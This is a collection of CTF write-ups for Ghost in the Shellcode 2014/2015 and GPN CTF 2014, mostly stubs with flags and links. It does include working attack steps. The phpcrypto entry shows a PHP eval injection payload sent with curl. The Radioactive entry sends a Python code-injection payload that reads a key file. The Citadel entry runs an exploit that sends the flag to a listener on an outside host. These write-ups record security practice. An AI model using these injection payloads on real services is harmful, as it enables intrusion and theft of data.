* <http://balidani.blogspot.com/2014/01/ghost-in-shellcode-2014-papsmear-writeup.html>
* [Russian](http://h0n3yp0t.ru/?p=226)
* [Chinese](http://ddaa.logdown.com/posts/176385-gits-2014-reverse-engineering-150-papsmear)
# Ghost in the Shellcode 2014: phpcrypto

**Category:** Recon
**Points:** 100
**Description:**

> GitS Presents [PHPCrypto 0.000001](http://phpcrypto.2014.ghostintheshellcode.com/)

## Write-up

The HTML source code of the linked page contains the following:

```js
function encrypt()
{
  key = $("#key")[0].value;
  plaintexthex = toHex($("#plaintext")[0].value);
  function success(data) {$("#ciphertext")[0].value = $.parseJSON(data).returnValue;}
  $.post('crypto.php', {"function":"customCrypto", "key":key, "plaintexthex":plaintexthex}, success );
}

function decrypt()
{
  key = $("#key")[0].value;
  ciphertext = $("#ciphertext")[0].value;
  function success(data) {$("#plaintext")[0].value = toAscii($.parseJSON(data).returnValue);}
  $.post('crypto.php', {"function":"customCrypto", "key":key, "plaintexthex":ciphertext}, success );
}
```

So, for encoding and decoding, a POST request is made to `/crypto.php` with the name of the function (`customCrypto`), the entered key, and the hexadecimal representation of the input text (for encoding) or the ciphertext (for decoding).

There’s also this comment:

```js
/*
TODO: add support for "help" and "dump" functions
*/
```

When using the `dump` function, the server returns an HTML document containing the syntax-highlighted source code of [the PHP script](https://github.com/ctfs/write-ups/blob/master/ghost-in-the-shellcode-2014/phpcrypto/source.php):

```bash
$ curl http://phpcrypto.2014.ghostintheshellcode.com/crypto.php --data 'function=dump' > source.html
```

In some cases [the `customCrypto` function](https://github.com/ctfs/write-ups/blob/af43d4f482f869c9c3ba5a0c0bd88e57adf0f39e/ghost-in-the-shellcode-2014/phpcrypto/source.php#L68-L130) ends up in a code path where [`assert()`](http://php.net/assert) is executed:

```php
assert("\$message = \"ERROR! xorKey is: \".strlen(\$xorKey).\" bytes long and the plaintext is: \".strlen($plaintext).\" bytes long.\";");
```

`assert` is like `eval`, except it terminates script execution if the result is `false`. To get there, we need to pass the string `'true'` as the value for the third argument (`$DEBUG`).

That is possible because of this code:

```php
$params = $_POST;
unset($params['function']);

$param_string='';
foreach($params as $key=>$param)
{
    $param = preg_replace('/[^A-Za-z0-9]/','',$param);
    $param_string.=(($param_string)?',':'')."'".$param."'";
}

if (isset($DEBUG) && $DEBUG == "true") { error_log($_POST['function']."($param_string);"); }
eval("echo ".$_POST['function']."($param_string);");
```

All we need to do is use `DEBUG=true` (or `x=true` — the key doesn’t really matter) as the third key/value pair in the POST data, not counting the `function` parameter. This enables remote code execution:

```bash
$ echo -n '").system("ls");//' | xxd -p # will be used as the value for `plaintexthex`
22292e73797374656d28226c7322293b2f2f

$ curl http://phpcrypto.2014.ghostintheshellcode.com/crypto.php --data 'function=customCrypto&key=a&plaintexthex=22292e73797374656d28226c7322293b2f2f&DEBUG=true'
crypto.php
index.php
jquery-1.8.0.min.js
key
{"errorMsg":"The key is: ; and the plaintext is: key","returnValue":"1912154842484f5e56131957481912001414"}
```

Aha! There’s a file named `key`. Let’s see what it says:

```bash
$ curl http://phpcrypto.2014.ghostintheshellcode.com/key
ThisWasAStupidTestKeyThatBecameARealBoy
```

## Other write-ups and resources

* <http://tasteless.eu/2014/01/gits-2014-phpcrypto-recon-100/>
# Ghost in the Shellcode 2014: Pillowtalk

**Category:** Crypto
**Points:** 200
**Description:**

> Find the key! [File](https://2014.ghostintheshellcode.com/pillowtalk-a692e2669fa69d57870e55608888f02303d35ca3).

## Write-up

The headers of the provided `pillowtalk-a692e2669fa69d57870e55608888f02303d35ca3` file contain `7zXZ`, indicating it’s `xz`-compressed data.

So, extract the provided file using [p7zip](http://p7zip.sourceforge.net/):

```bash
7z x pillowtalk-a692e2669fa69d57870e55608888f02303d35ca3
```

Then, … (TODO)

The flag is `WhyDoFartsSmell?SoTheDeafCanEnjoyThemAlso`.

## Other write-ups and resources

* <https://systemoverlord.com/blog/2014/01/19/ghost-in-the-shellcode-2014-pillowtalk/>
* <http://broot.ca/gitsctf-pillowtalk-crypto-200>
* <https://www.youtube.com/watch?v=G50typU3mLg>
# Ghost in the Shellcode 2014: Portal

**Category:** Choose your Pwn Adventure 2
**Points:** 200
**Description:**

> Find the key! [File](https://2014.ghostintheshellcode.com/portal-f94ee69683a4275df11707cd4a14f611ce12b5a0)

## Write-up

(TODO)

The flag is `Cave Johnson hates Black Mesa`.

## Other write-ups/resources

* <http://digitaloperatives.blogspot.com/2014/01/ghost-in-shellcode-2014-choose-your-pwn.html>
* [Source code for this challenge (released by the author after the CTF)](https://github.com/LightningTH/GiTS/tree/master/Portal)
* [Video of challenge](https://www.youtube.com/watch?v=70yLPDX7UxA)
# Ghost in the Shellcode 2014: Rabbit of Caerbannog

**Category:** Choose your Pwn Adventure 2
**Points:** 75
**Description:**

> Challenge available from within PwnAdventure2.

## Write-up

The challenge was to defeat a seemingly invincible rabbit.

Reading the code reveals that it can only be killed using a _Holy Hand Grenade_, an item that can only be traded for _89 gears_. Unfortunately, there is no legitimate way to get _gears_.

However, you can get them by triggering an integer overflow. Try to buy 999,999,999 Holy Hand Grenades at once, and this will give you lots of grenades and lots of gears, too.

The flag is `Thy_foe_b31ng_n4ughty_1n_My_s1ght_shall_snuff_it`.

## Other write-ups and resources

* <http://balidani.blogspot.com/2014/01/ghost-in-shellcode-2014-pwn-adventure-2.html>
* <http://tasteless.eu/2014/01/gits-2014-rabbit-of-caerbannog-pwn-adventure-75/>
# Ghost in the Shellcode 2014: Radioactive

**Category:** Crypto
**Points:** 250
**Description:**

> Find the key. [File](https://2014.ghostintheshellcode.com/radioactive-684d33ba06af30b9ad1a79abb3c6cecec74db18e) running at radioactive.2014.ghostintheshellcode.com:4324.

## Write-up

Write-up by [Matir](https://systemoverlord.com/).

The headers of the provided `radioactive-684d33ba06af30b9ad1a79abb3c6cecec74db18e` file contain `7zXZ`, indicating it’s `xz`-compressed data.

So, extract the file using the built-in `xz` or `unxz` commands:

* `xz -dc < radioactive-684d33ba06af30b9ad1a79abb3c6cecec74db18e > radioactive.txt`
* `unxz < radioactive-684d33ba06af30b9ad1a79abb3c6cecec74db18e > radioactive.txt`

Alternatively, extract the provided file using [p7zip](http://p7zip.sourceforge.net/):

```bash
7z x radioactive-684d33ba06af30b9ad1a79abb3c6cecec74db18e
```

Then, you can see that the included code is a Python script, the core of which is below:

```python
class RadioactiveHandler(SocketServer.BaseRequestHandler):
  def handle(self):
    key = open("secret", "rb").read()
    cipher = AES.new(key, AES.MODE_ECB)

    self.request.send("Waiting for command:\n")
    tag, command = self.request.recv(1024).strip().split(':')
    command = binascii.a2b_base64(command)
    pad = "\x00" * (16 - (len(command) % 16))
    command += pad

    blocks = [command[x:x+16] for x in xrange(0, len(command), 16)]
    cts = [str_to_bytes(cipher.encrypt(block)) for block in blocks]
    for block in cts:
      print ''.join(chr(x) for x in block).encode('hex')

    command = command[:-len(pad)]

    t = reduce(lambda x, y: [xx^yy for xx, yy in zip(x, y)], cts)
    t = ''.join([chr(x) for x in t]).encode('hex')

    match = True
    print tag, t
    for i, j in zip(tag, t):
      if i != j:
        match = False

    del key
    del cipher

    if not match:
      self.request.send("Checks failed!\n")
    eval(compile(command, "script", "exec"))

    return
```

So, it looks for a `tag:command` pair, where the tag is hex-encoded and the command is base64-encoded. The command must be valid Python, passed through `compile` and `eval`, so you’ll need to send a response back to yourself via `self.request.send()`.

So how’s the tag calculated? Every 16-byte block of the command is encrypted in AES-ECB mode (so, two identical plaintexts == two identical ciphertexts) and then the encrypted blocks are XORed together, producing the final tag. My first thought was to generate a plaintext such that `len(plain) % 16 == 0`, then repeat it twice, so the XORs will cancel out and give a tag of `00…00`. Unfortunately, the padding must be at least one byte long, and the plaintext cannot contain null bytes.

So, we were also provided some sample code. One such example, decoded from its base64 representation, turns out to be:

```python
import os

self.request.send("Send command to eval: \n")
cmd = self.request.recv(1024).strip()

good = True
for b in cmd:
  if b not in '0123456789+-=/%^* ()':
    good = False

if good:
  self.request.send(str(eval(cmd)) + "\n")
else:
  self.request.send("???\n")
```

It turns out the line `good = False` (and two trailing newlines) are their own 16-byte block. We can append `good = True \n\n` to reset it to the value of `True`, and append it a second time to get our tag to come out correctly. Then we can simply provide `self.request.send(open('key').read())` when we receive our “Send command to `eval`:” prompt, and this got our flag.

Alternatively, because of a bug in the signature checking, we can just send the base64-encoded payload as long as we provide an empty tag:

```bash
$ base64 <<< "self.request.send(open('key').read())"
c2VsZi5yZXF1ZXN0LnNlbmQob3Blbigna2V5JykucmVhZCgpKQo=

$ echo ':c2VsZi5yZXF1ZXN0LnNlbmQob3Blbigna2V5JykucmVhZCgpKQo=' | nc -v radioactive.2014.ghostintheshellcode.com 4324
found 0 associations
found 1 connections:
     1: flags=82<CONNECTED,PREFERRED>
    outif en0
    src 192.168.107.131 port 59275
    dst 107.20.236.180 port 4324
    rank info not available
    TCP aux info available

Connection to radioactive.2014.ghostintheshellcode.com port 4324 [tcp/*] succeeded!
Waiting for command:
Welcom3ToTheNewAgeItsARevolutionISuppose
```

The flag is `Welcom3ToTheNewAgeItsARevolutionISuppose`.

## Other write-ups and resources

* <https://systemoverlord.com/blog/2014/01/19/ghost-in-the-shellcode-2014-radioactive/>
* <http://tasteless.eu/2014/01/gits-2014-radioactive-crypto-250/>
# Ghost in the Shellcode 2014 write-ups

* <http://ghostintheshellcode.com/2014-final/>
* [Scoreboard](scoreboard.txt)
* [Trailer](https://www.youtube.com/watch?v=qzDyqWHzhjA&hd=1)
* [Choose Your Pwn Adventure 2 Credits](https://www.youtube.com/watch?v=PXFsGdnAYkg&hd=1)
* [Solve counts](http://ghostintheshellcode.com/2014-final/solve-counts.txt)
* [Team solves](http://ghostintheshellcode.com/2014-final/team-solves.txt)

## Completed write-ups

* [Ad Subtract](ad-subtract)
* [Cave of Nope](cave-of-nope)
* [CTF247](ctf247)
* [DOS Attack](dos-attack)
* [Moon Boots](moon-boots)
* [one](one)
* [phpcrypto](phpcrypto)
* [Rabbit of Caerbannog](rabbit-of-caerbannog)
* [Radioactive](radioactive)
* [Revenge of Imgception](revenge-of-imgception)

## External write-ups only

* [A Boaring Quest](a-boaring-quest)
* [Boaring Music](boaring-music)
* [Byte Sexual](byte-sexual)
* [Dogecrypt](dogecrypt)
* [Fuzzy](fuzzy)
* [gitsmsg](gitsmsg)
* [Gitzino](gitzino)
* [inview](inview)
* [lugkist](lugkist)
* [PapSmear](papsmear)
* [Pillowtalk](pillowtalk)
* [Portal](portal)
* [TI-1337](ti-1337)
* [TrustMeMore](trustmemore)
* [Unbearable](unbearable)

## Incomplete write-ups

* [Long Live the Queen](long-live-the-queen)
* [Snow Down](snow-down)
# Ghost in the Shellcode 2014: Revenge of Imgception

**Category:** Forensics
**Points:** 300
**Description:**

> Find the key. [Link](https://2014.ghostintheshellcode.com/roi-0252563f02b4e004978185322f1766b0/index.html)

## Write-up

The HTML source for that link is:

```
<html
<head>
  <script>
    function get_image() {
      var i = new Image();
      var num = parseInt((Math.random() * 50), 10) +1
      i.src = './' + num;
      document.getElementById('t').appendChild(i);
    }
  </script>
</head>
<body onload="get_image()">
  <div id="t"></div>
</body>
</html>
```

The `get\_image` function generates a number from 1 to 50, and then uses that as part of the URL for an image. The image files don’t have an extension, but looking at the headers it’s obvious they’re JPEGs. So, let’s download them all:

```bash
$ for i in {1..50}; do curl -# "https://2014.ghostintheshellcode.com/roi-0252563f02b4e004978185322f1766b0/${i}" > "${i}.jpg"; done
```

The clue to the next step is hidden as base64-encoded data in the comment fields (`\xFF\xFE`) of these images. The number of comment fields is variable because they have a maximum size of `65535` (`0xFFFF`).

The extracted data is an animated GIF file. The next stage is hidden in a set of comment extensions as binary data. The number of comment extensions is variable depending on the size of the next stage.

The extracted data is is a zip file full of PNG images. The next stage is spread among them. Each PNG has a custom chunk marked with a `icTf` header. Each chunk begins with 3 bytes of the order string (`'ThankYouMarioButOurPrincessIsInAnotherCastle' * 20`) followed by a null byte, followed by binary data. The binary data chunks from each file must be concatenated together in the order given by the order string. The entirety of the order string may not be used, as the zip contains a variable number of files.

That results in a new file, which is a floppy disk image containing a Super Mario Brothers ROM image for the Nintendo Entertainment System. This can be played in [the FCEUX emulator](http://www.fceux.com/web/home.html), but that’s a red herring. Instead, the key to the next stage has been concatenated to the end of the ROM, and is marked with `'GITS' * 512`.

The next file is an ISO image with a hidden directory. When mounted with default (Linux) options, the only apparent file is a JPEG image. However, when mounted with the `--no-joliet` option, the next stage becomes apparent.

The file is a multi-page TIFF image with broken file magic. The file magic is `\x49\x4d\x2a\x2a`. The TIFF file header indicates whether the image is little endian or big endian by the first two bytes being either `\x49\x49` (little) or `\x4d\x4d` (big). The next two bytes are similarly arranged, either `\x2a\x00` (little) or `\x00\x2a` (big). The correct file header for this image is `\x49\x49\x2a\x00`. Once the header is fixed, the image contains three images - one world 7-1 image and two apparently identical world 8-1 images that constitute the next stage.

The files are two apparently identical greyscale BMP images. The images are not, however, identical. The final image is steganographically hidden in the delta between color byte values. By subtracting the byte values in one file from the corresponding byte in the other, some bytes result in a value between `-8` and `+7`. Each value represents a single nibble of the final image.

The final image contains a congratulatory message and the key: `K00pas@llth3w@yd0wn`.

## Other write-ups and resources

* <http://pastebin.com/q8Lf8M0w>
# Ghost in the Shellcode 2014: Snow Down

**Category:** Choose your Pwn Adventure 2
**Points:** 250
**Description:**

> Challenge available from within PwnAdventure2.

## Write-up

(TODO)

The flag is `Real pirates use Z3 not a cutlass`.
# Ghost in the Shellcode 2014: TI-1337

**Category:** Pwnable
**Points:** 100
**Description:**

> Find the key! [File](https://github.com/ctfs/write-ups/blob/master/ghost-in-the-shellcode-2014/ti-1337/ti-5b1ab693bc0298f8da4b22612d1a7683ed55d93a) running at ti-1337.2014.ghostintheshellcode.com

## Write-up

(TODO)

The flag is `WhyDidTheChickenCrossTheMobiusStrip`.

## Other write-ups and resources

* <http://www.ctf.dk/gits-2014-ti-1337>
* <https://blog.skullsecurity.org/2014/ghost-in-the-shellcode-ti-1337-pwnable-100>
* <http://delogrand.blogspot.com/2014/01/ghost-in-shellcode-2014-ti-1337.html>
* <https://gist.github.com/withzombies/8514659>
* [Russian](http://h0n3yp0t.ru/?p=207)
# Ghost in the Shellcode 2014: TrustMeMore

**Category:** Reverse Engineering
**Points:** 150
**Description:**

> We let your ex write a service. Running at trustmemore.2014.ghostintheshellcode.com:7457. Password: trust is 74u57 -- but l33t doesn't have a u. Note: This challenge is not NAT-friendly.

## Write-up

(TODO)

The flag is `OnlyDDTEKWouldDoSomethingThisEvil`.

## Other write-ups and resources

* <http://blog.zachorr.com/trustmemore/>
* [Source code for this challenge](https://gist.github.com/anonymous/8508605) (released after the CTF)
* <https://gist.github.com/withzombies/8514724>
# Ghost in the Shellcode 2014: Unbearable

**Category:** Choose your Pwn Adventure 2
**Points:** 75
**Description:**

> Challenge available from within PwnAdventure2.

## Write-up

The challenge was to open a chest located in an area full of dangerous bears. To make things worse, cracking the chest takes five full minutes, during which the bears start shooting at you with machine guns.

When you drink _Wine_ in Choose Your Pwn Adventure 2, you get a slight damage resistance boost. To solve this challenge, hack this modifier to make you completely invulnerable instead. This allows you to get past the many dangerous machine-gun-armed bears.

(TODO)

The flag is `The Drunken Master can bear any trial`.

## Other write-ups and resources

* <http://balidani.blogspot.com/2014/01/ghost-in-shellcode-2014-pwn-adventure-2.html>
* <http://lockboxx.blogspot.com/2014/01/ghost-in-shellcode-2014-ctf-writeup.html>
* <http://quangntenemy.blogspot.com/2014/01/ghost-in-shellcode-2014.html>
* <http://tasteless.eu/2014/01/gits-2014-unbearable-pwn-adventure-75>
# Ghost in the Shellcode 2015 teaser: Citadel

**Description:**

> Steal the key!
>
> [File](citadel-4ee854f5f99e4c62924059a2838cd6147f42d54f9e743b4dbe873aa10b850a32) running at citadel.2015.ghostintheshellcode.com:5060

## Write-up

(TODO)

Locally, run `solve.py` after changing the `server_ip` and `server_port` variables:

```bash
$ python solve.py
[+] Opening connection to citadel.2015.ghostintheshellcode.com on port 5060: OK
memcmp at: 0x00007faa50223ae0
system at: 0x00007faa50109530
Flag should be on its way!
[*] Closed connection to citadel.2015.ghostintheshellcode.com port 5060
```

But before that, start listening on the IP/port you specified in `solve.py`. When `solve.py` runs, the flag is sent there.

```bash
$ nc -vlp 9001
listening on [any] 9001 ...
connect to [13.33.33.37] from ec2-54-83-45-212.compute-1.amazonaws.com [54.83.45.212] 51867
key{Should have used boost::format}
```

The flag is `key{Should have used boost::format}`.

## Other write-ups and resources

* [Write-up by team gn00bz](http://gnoobz.com/gits-teaser-2015-ctf-citadel-writeup.html)
* [Exploit by team gn00bz](solve.py)
* <http://www.clevcode.org/ghost-in-the-shellcode-2015-teaser-citadel-solution/>
* <http://pastebin.com/MS3KG1um>
# Ghost in the Shellcode 2015 teaser: Don’t Panic! Shift Keying!

**Description:**

> Extract the key!
>
> [File](dontpanic-8f27ebde0a2a714871c57e4d9a526b06c86b12212249f984cdb9eefe81bf8f7c)

## Write-up

```bash
$ file dontpanic-8f27ebde0a2a714871c57e4d9a526b06c86b12212249f984cdb9eefe81bf8f7c
dontpanic-8f27ebde0a2a714871c57e4d9a526b06c86b12212249f984cdb9eefe81bf8f7c: bzip2 compressed data, block size = 600k

$ bunzip2 < dontpanic-8f27ebde0a2a714871c57e4d9a526b06c86b12212249f984cdb9eefe81bf8f7c > dontpanic

$ file dontpanic
dontpanic: POSIX tar archive

$ tar xjfv dontpanic
x dontpanicshiftkeying/README
x dontpanicshiftkeying/key.iq
x dontpanicshiftkeying/
x dontpanicshiftkeying/dontpanicshiftkeying.jpg
```

(TODO)

## Other write-ups and resources

* <http://gnoobz.com/gits-teaser-2015-ctf-dont-panic-shift-keying-writeup.html>
* <http://www.clevcode.org/ghost-in-the-shellcode-2015-teaser-dont-panic-shift-keying-solution/>
# Ghost in the Shellcode 2015 teaser: Lost to Time

**Description:**

> So I lost my computer. And also my compiler and most of the documentation. Can you help me, please?
>
> [File](losttotime-fe4ed7af5cefa136e2c72f67810b72b0de269a72cc2f61ce649f6d1ce759b396)

## Write-up

```bash
$ file losttotime-fe4ed7af5cefa136e2c72f67810b72b0de269a72cc2f61ce649f6d1ce759b396
losttotime-fe4ed7af5cefa136e2c72f67810b72b0de269a72cc2f61ce649f6d1ce759b396: xz compressed data

$ unxz < losttotime-fe4ed7af5cefa136e2c72f67810b72b0de269a72cc2f61ce649f6d1ce759b396 > losttotime

$ file losttotime
losttotime: ASCII text
```

The `losttotime` file has the following contents:

```
          IDENT     CTF
          ABS
          SST
          ENTRY     CTF
          SYSCOM    B1
          SPACE  4,10
          ORG    110B
 FWA      BSS    0

 BUFL     EQU    401B

 F        BSS    0
 ZZZZZG0  FILEB  FBUF,BUFL,DTY=2RTT

 CTF      BSS       0
          SB1       1
          SA1       CTFB
          BX6       X1
          SB7       27
          SA6       A1
          SA2       CTFA
          MX0       30
          SA1       A2+B1

 CTF2     BX6       X0*X1
          ZR        X6,CTF4
          JR        FCT
          SA6       A6+B1
          BX6       -X0*X1
          ZR        X6,CTF4
          JR        FCT
          SA6       A6+B1
          SA1       A1+B1
          NZ        X1,CTF2

 CTF4     WRITES    F,CTFB,CTFBL
          ENDRUN

 FCT      SUBR
          CX6       X6
          SB6       X6
          LT        B6,B7,FCT2
          SB6       B6-B7
          SB6       B6+B6
          SB5       B6+B6
          SB5       B5+B5
          SB6       B5+B6
          AX6       X2,B6
          MX7       -10
          BX6       -X7*X6
 FCT2     JP        FCTX

 CTFA     BSS       0
          VFD       6/00B,9/000B,9/000B,9/520B,9/244B,9/120B,9/057B
          VFD       6/40B,9/210B,9/003B,9/100B,9/774B,9/415B,9/040B
          VFD       6/00B,9/000B,9/400B,9/000B,9/442B,9/211B,9/001B
          VFD       6/77B,9/776B,9/777B,9/770B,9/010B,9/002B,9/004B
          VFD       6/77B,9/377B,9/577B,9/610B,9/040B,9/000B,9/400B
          VFD       6/00B,9/100B,9/200B,9/343B,9/556B,9/115B,9/671B
          VFD       6/00B,9/000B,9/004B,9/441B,9/625B,9/031B,9/752B
          VFD       6/63B,9/015B,9/236B,9/227B,9/165B,9/273B,9/762B
          VFD       6/27B,9/167B,9/713B,9/057B,9/111B,9/504B,9/353B
          VFD       6/14B,9/205B,9/324B,9/130B,9/006B,9/000B,9/100B
          VFD       6/67B,9/775B,9/673B,9/736B,9/000B,9/000B,9/000B
          VFD       6/10B,9/007B,9/000B,9/204B,9/666B,9/666B,9/661B
          VFD       6/10B,9/010B,9/010B,9/010B,9/002B,9/000B,9/000B
          VFD       6/35B,9/671B,9/077B,9/650B,9/001B,9/000B,9/000B
          VFD       6/70B,9/000B,9/000B,9/007B,9/677B,9/737B,9/566B
          VFD       6/40B,9/000B,9/000B,9/044B,9/000B,9/700B,9/004B
          VFD       6/57B,9/135B,9/427B,9/072B,9/000B,9/400B,9/010B
          VFD       6/54B,9/710B,9/650B,9/722B,9/667B,9/170B,9/671B
          VFD       6/37B,9/503B,9/354B,9/061B,9/653B,9/521B,9/704B
          VFD       6/67B,9/531B,9/564B,9/700B,9/000B,9/000B,9/004B
          VFD       6/12B,9/345B,9/677B,9/674B,9/127B,9/002B,9/011B
          VFD       6/27B,9/315B,9/340B,9/647B,9/003B,9/653B,9/700B
          VFD       6/77B,9/777B,9/777B,9/770B,9/000B,9/000B,9/000B
          VFD       6/00B,9/000B,9/000B,9/000B,9/000B,9/000B,9/055B
 CTFB     BSS       0
          DUP       64,1
          DATA      1R
 CTFBL    EQU       *-CTFB

 COMCPL   XTEXT     COMCCDD
 COMCPL   XTEXT     COMCCIO
 COMCPL   XTEXT     COMCCPM
 COMCPL   XTEXT     COMCDXB
 COMCPL   XTEXT     COMCLFM
 COMCPL   XTEXT     COMCSYS
 COMCPL   XTEXT     COMCWTS
 COMCPL   XTEXT     COMCWTW
 BUFFERS  SPACE     4,10
          USE       BUFFERS
 FBUF     EQU       *
 RFL=     EQU       FBUF+BUFL+10

          END
```

(TODO)

## Other write-ups and resources

* <https://sushant94.github.io/2014/12/15/gits_teaser_writeup/>
* <https://wwwcip.cs.fau.de/~hu78sapy/pdf/gits_teaser.pdf>
# Ghost in the Shellcode 2015 teaser write-ups

* <https://2015.ghostintheshellcode.com/>
* [Final scores](https://2015.ghostintheshellcode.com/final_scores.txt) or [local alternative](scoreboard.txt)

## Completed write-ups

* none yet

## External write-ups only

* [Citadel](citadel)
* [Don’t Panic! Shift Keying!](dont-panic-shift-keying)
* [Lost to Time](lost-to-time)

## Incomplete write-ups

* none yet
# GPN CTF 2014 - 42

**Category:** Trivia
**Points:** 200
**Description:**

>"Fertig jetzt Braucht das Ding nur noch einen Namen! .......................... "

> The challenge is related to this [image](photo_7c71eb4f1155f2ceab276f5ae4ae77d0.png)

> Solution: md5 as lowercase & without whitespace

> (Example: „All your base are belong to us“ => „allyourbasearebelongtous“)

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# GPN CTF 2014 - Are you hungry?

**Category:** Web
**Points:** 50
**Description:**


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# GPN CTF 2014 - Bounty Hunter

**Category:** Web
**Points:** 300
**Description:**

> [click here!](http://ctf.gpn.entropia.de:50206/)

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# GPN CTF 2014 - Bounty Hunter 2

**Category:** Web
**Points:** 700
**Description:**

> [click here](http://ctf.gpn.entropia.de:50217/)

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# GPN CTF 2014 - Broken auth

**Category:** Crypto
**Points:** 200
**Description:**

> Alice and Bernd are using a service to talk about some secret stuff. I'd like to know what they are talking about, but they're using PGP. They placed their public keys on a website and even bragged about the secure scheme they constructed just to keep me out :-( 

> Alice: endpoint [ctf.gpn.entropia.de:50200](ctf.gpn.entropia.de:50200), [alice-key](alice_5487b432da0050fd34dbd3f7cd3b3006.asc)

> Bernd: endpoint [ctf.gpn.entropia.de:50201](ctf.gpn.entropia.de:50200), [bernd-key](bernd_a4a0278e085a0bde2a71a1f35ba787ee.asc)

> Scheme: [scheme.txt](scheme_4484e425e364d68090d498677975ff91.txt)

> Can you figure out what they are talking about?

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# GPN CTF 2014 - Colorful life

**Category:** Programming
**Points:** 50
**Description:**


## Write-up

> Lock at the color and fill in the color code ... but don't be to slow
>
> http://IP/

## Other write-ups and resources

* none yet
# GPN CTF 2014 - Come closer

**Category:** Forensic
**Points:** ?
**Description:**


## Write-up

> 
> Description
> -------------
> You have come this far, but I think that's still not close enough. Convince me otherwise if you found something.
> Remember to hash the hidden message with MD5 to obtain the flag.
>
> [link to 500.png](500.png)

## Other write-ups and resources

* none yet
# GPN CTF 2014 - Do you see the rainbow

**Category:** Misc
**Points:** 100
**Description:**

> We found this [file](files_a1480b39f37c24308e8881d9374baa8d.rar) with 50 pictures. Maybe you can retrive some information.

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# GPN CTF 2014 - Doge_security

**Category:** Forensic
**Points:** 300
**Description:**

>We discovered an unknown security system and need to find the secrets stored in this system. Find them and send them to us.
MD5 the flag and sumbit in the format sqrts{MD5}

> File: [Doge_security.pcapng](Doge_security_f9253531c335ac6ca86c5e7bb3b1957d.pcapng)
## Write-up

(TODO)

## Other write-ups and resources

* none yet
# GPN CTF 2014 - Espionage

**Category:** Crypto
**Points:** 100
**Description:**

> We found a server with an open port that apparently is able to decrypt numbers that were encrypted with a certain public key. Our intelligence team was able to retrieve this screenshot: 
[image](screen_photo_f6a648b0ec327f34ee0d4e31afe7cc29.jpg)

>Unfortunately we were caught in the act. While the team was able to escape we are not sure if the discovered information is of any use...

> Here is the connection:
> [ctf.gpn.entropia.de:50094](ctf.gpn.entropia.de:50094)

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# GPN CTF 2014 - Gallery

**Category:** Web
**Points:** 200
**Description:**

> Buy now! Our patent-pending and award-winning image gallery software offers sophisticated functionalities. Try the free version of our gallery and buy it for only 999€ a month: http://ctf.gpn.entropia.de:50205

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# GPN CTF 2014 - H<sup>3</sup> Programming

**Category:** Programming
**Points:** 200
**Description:**

> We retrieved some login credentials from another hacker to login to his secure Web site. We think there is some information which is useful for us.
> We tried to login, but the captcha seems to be broken. Can you help us? Use the name "pearce" and the password     `"Elb%hzJ4GL=6/Y+7[AlNu\/uAnF>p:v#1ZdhkOWH"` to login and retrieve the data for us.

>[start here](http://ctf.gpn.entropia.de:50096/)

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# GPN CTF 2014 - Hidden below

**Category:** Forensic
**Points:** 200
**Description:**

> They never found the monster. I hope you have more success with the secret hidden somewhere in the lake.
Hash it with MD5 to obtain the flag and sumbit in the format sqrts{hash}

> File: [200.jpg](200_10c82e36e81319414cce7840d73476aa.jpg)

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# GPN CTF 2014 - I see you...

**Category:** Crypto
**Points:** 100
**Description:**

>Let's start simple. Try to decrypt this file:

> [enc](enc_2e4c08a4273c54d68a0f03dd4e5e91fd)

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# GPN CTF 2014 - Matrix

**Category:** Misc
**Points:** ?
**Description:**


## Write-up

> So we got this binary blob. There should be some data in it. Good luck, we're counting on you!
> [link to signal.bin](signal.bin)

## Other write-ups and resources

* none yet
# GPN CTF 2014 - PDFun

**Category:** Misc
**Points:** ?
**Description:**


## Write-up

> Description
> ------------
> PDFun: We found this PDF File, but wie didn't know how to get the information hidden in it
>
> [link to task.pdf](task.pdf)

## Other write-ups and resources

* none yet
# GPN CTF 2014 - QR Code

**Category:** Misc
**Points:** ?
**Description:**


## Write-up

> To solve this challenge, come to our desk with a QR code containing your scoreboard username. You can either use a device or a printout.

## Other write-ups and resources

* none yet
# GPN CTF 2014

* Main website
* Scoreboard
* [@squareroots CTF Team on Twitter](https://twitter.com/sqrts)

## Completed write-ups

* none yet

## External write-ups only

* none yet

## Incomplete write-ups

* [42](42)
* [Are you hungry?](are-you-hungry)
* [Bounty Hunter](bounty-hunter)
* [Bounty Hunter 2](bounty-hunter-2)
* [Broken auth](broken-auth)
* [Colorful life](colorful-life)
* [Come closer](come-closer)
* [Do you see the rainbow?](do-you-see-the-rainbow)
* [Doge\_security](doge-security)
* [Espionage](espionage)
* [Gallery](gallery)
* [H3 programming](h3-programming)
* [Hidden below](hidden-below)
* [I see you...](i-see-you)
* [Matrix](matrix)
* [PDFun](pdfun)
* [QR Code](qr-code)
* [South pole](south-pole)
* [SQLI](sqli)
* [Super Quadragon](super-quadragon)
* [Superbrain](superbrain)
* [Time is up](time-is-up)
* [Totally secure auth](totally-secure-auth)
* [Weird Garbage](weird-garbage)
* [Where is Kurk Krabbel](where-is-kurt-krabbel)
# GPN CTF 2014 - South pole

**Category:** Trivia
**Points:** 100
**Description:**

> We heard you were in Antarctica last week. Would you be so kind and send us your favourite vacation snap?

> [Upload your snap here](http://ctf.gpn.entropia.de:50050/) 

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# GPN CTF 2014 - SQLI

**Category:** Web
**Points:** ?
**Description:**


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# GPN CTF 2014 - Super Quadragon

**Category:** Forensic
**Points:** 100
**Description:**

> Quadragon: "The thingy you call a square when your high."

>Now go find the secret hidden in the image.

> Hash it with MD5 to obtain the flag and submit in the format sqrts{hash}

> File: [100.bmp](100_50030fd140a26c698114361f3b0b8557.bmp)

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# GPN CTF 2014 - Superbrain

**Category:** Programming
**Points:** ?
**Description:**


## Write-up

> Description
> ------------
> This server wants to play with us. Try to get the flag
>
> nc ip port

## Other write-ups and resources

* none yet
# GPN CTF 2014 - Time is up

**Category:** Programming
**Points:** ?
